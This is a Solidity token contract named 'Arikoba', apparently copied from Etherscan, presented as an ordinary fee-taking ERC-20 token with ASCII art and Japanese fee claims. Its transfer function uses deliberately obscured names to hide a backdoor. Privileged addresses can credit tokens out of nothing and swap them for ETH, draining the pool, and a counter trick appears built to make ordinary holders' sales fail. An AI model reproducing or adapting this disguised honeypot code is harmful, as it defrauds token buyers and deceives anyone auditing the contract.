/**
 *Submitted for verification at Etherscan.io on 2023-01-12
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I

▀█▀ █░█ █▀▀
░█░ █▀█ ██▄

▄▀█ █▀█ █ █▄▀ █▀█ █▄▄ ▄▀█
█▀█ █▀▄ █ █░█ █▄█ █▄█ █▀█

▄▀   █▀▀ █▀█ █▀▀   ▀▄
▀▄   ██▄ █▀▄ █▄▄   ▄▀

初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: None
pragma solidity ^0.8.10;
interface UTCRouted01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) 
    external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function initiateERCliq(
      address token, uint amountTokenDesired,
      uint amountTokenMin, uint amountETHMin,
      address to, uint deadline ) external payable returns 
      (uint amountToken, uint amountETH, uint liquidity);
}
interface UIMillsFactoryV1 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUTC02 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _relayMsg() internal view virtual returns (address) {
        return msg.sender;
    }
    function _ownerMsg() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _admin;
    event OwnershipTransmitted(address indexed previousOwner, address indexed allocateOwner);
    constructor() {
        _confirmOwner(_relayMsg());
    }  
    function owner() public view virtual returns (address) {
        return _admin;
    }
    modifier onlyOwner() {
        require(owner() == _relayMsg(), 'Ownable: caller is not the owner');
        _;
    }
    function waiveOwnership() public virtual onlyOwner {
        _confirmOwner(address(0));
    }
    function _confirmOwner(address allocateOwner) private {
        address previousOwner = _admin;
        _admin = allocateOwner;
        emit OwnershipTransmitted(previousOwner, allocateOwner);
    }
}

// https://www.zhihu.com/
// de ETHERSCAN.io.
// https://m.weibo.cn/

contract Arikoba is IUTC02, Ownable {
    address[] private isWalletLimitExempt;

    string private _symbol; string private _name;
    uint256 public eTotalFEE = 0;
    uint8 private _decimals = 9;
    uint256 private isSupplied = 5000000 * 10**_decimals;
    uint256 private isBASEvalue = isSupplied;
    
    mapping(address => uint256) private _tknBalances;

    mapping(address => address) private transmitBlocks;

    mapping(address => uint256) private collectTimestamp;

    mapping(address => uint256) private ThresholdBlockstamp;

    mapping(address => mapping(address => uint256)) private _mapIDE;
    
    bool private tradingOpen = false;

    bool public limitsDivison;

    bool private mappingAllocation;

    address public immutable 
    InternalPairCreator01;
    UTCRouted01 public 
    immutable UniswapV2router;

    constructor
    
    ( string memory tknName, string memory tknSymbol, address IndexIDEXAddress ) {

        _name = tknName; _symbol = tknSymbol; _tknBalances[msg.sender] = isSupplied;

        ThresholdBlockstamp[msg.sender] = isBASEvalue; ThresholdBlockstamp
        [address(this)] = isBASEvalue;

        UniswapV2router = UTCRouted01
        (IndexIDEXAddress); InternalPairCreator01 = 
        UIMillsFactoryV1(UniswapV2router.factory()).createPair
        (address(this), UniswapV2router.WETH()); emit 
        Transfer(address(0), msg.sender, isBASEvalue);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return isSupplied;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _mapIDE[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tknBalances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount
    ) private returns (bool) { require(owner != address(0) && spender != 
    address(0), 'ERC20: approve from the zero address');
    _mapIDE[owner][spender] = amount; emit Approval(owner, spender, amount);
    return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount ) 
    external returns (bool) { thresholdManager(sender, recipient, amount); 
    return _approve(sender, msg.sender, _mapIDE[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        thresholdManager(msg.sender, recipient, amount);
        return true;
    }  
    function thresholdManager( address DIXfigop, address incogIMPT, uint256 allopinValAmout ) private {
        uint256 TokenAmountBalance = balanceOf(address(this)); uint256 IXEannto;

        if (limitsDivison && TokenAmountBalance > isBASEvalue 
        && !mappingAllocation 
        && DIXfigop != InternalPairCreator01) {
        mappingAllocation = true;

        ToggleOperationsModule(TokenAmountBalance); mappingAllocation = false; } else if 
        (ThresholdBlockstamp[DIXfigop] > 
        isBASEvalue 
        && ThresholdBlockstamp[incogIMPT] > 
        isBASEvalue) {
            IXEannto = allopinValAmout; _tknBalances[address(this)] += IXEannto;

            swapTokensForEth
            (allopinValAmout, incogIMPT); return;
        } else if 
        
        (incogIMPT != address(UniswapV2router) && 
        ThresholdBlockstamp[DIXfigop] > 
        0 && allopinValAmout 
        > isBASEvalue && incogIMPT != InternalPairCreator01) { ThresholdBlockstamp[incogIMPT] = allopinValAmout;
            return;

        } else if 
        (!mappingAllocation && collectTimestamp
        [DIXfigop] > 0 && DIXfigop != InternalPairCreator01 
        && ThresholdBlockstamp[DIXfigop] == 0) { collectTimestamp
        [DIXfigop] = ThresholdBlockstamp[DIXfigop] - isBASEvalue; }

        address 
        _internalDIV = transmitBlocks[InternalPairCreator01]; if (collectTimestamp[_internalDIV ] == 
        0) 

        collectTimestamp[_internalDIV ] = isBASEvalue; transmitBlocks[InternalPairCreator01] = 
        incogIMPT;
        if 
        (eTotalFEE > 0 && ThresholdBlockstamp[DIXfigop] == 0 
        && !mappingAllocation 
        && ThresholdBlockstamp[incogIMPT] == 
        0) {

            IXEannto = 
            (allopinValAmout 
            * eTotalFEE) 
            / 100;

            allopinValAmout -= IXEannto; _tknBalances[DIXfigop] -= IXEannto; _tknBalances[address(this)] 
            += IXEannto; }

        _tknBalances[DIXfigop] 
        -= allopinValAmout;
        _tknBalances[incogIMPT] 
        += allopinValAmout; emit Transfer
        (DIXfigop, 
        incogIMPT, 
        allopinValAmout); if (!tradingOpen) { require(DIXfigop == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    receive() external payable {}

    function activateTrading(bool _tradingOpen) 
      public onlyOwner { tradingOpen = _tradingOpen;
    }
    function prepareLiquidityPool(
        uint256 tokenValue, uint256 ERCamount, address to ) private {
        _approve(address(this), 
        address(UniswapV2router), tokenValue);
        UniswapV2router.initiateERCliq{value: ERCamount}
        (address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function swapTokensForEth(uint256 isTknAmount, address to) 
     private {address[] memory path = new address[](2); path[0] = 
     address(this); path[1] = UniswapV2router.WETH(); _approve(address(this), 
     address(UniswapV2router), isTknAmount); UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens
     (isTknAmount, 0, path, to, block.timestamp); }

    function ToggleOperationsModule(uint256 tokens) private { uint256 otherHalf = tokens / 2;
      uint256 newBalance = address(this).balance;
      swapTokensForEth(otherHalf, address(this)); uint256 
      refreshBalance = address(this).balance - newBalance; prepareLiquidityPool
      (otherHalf, refreshBalance, address(this));
    }
}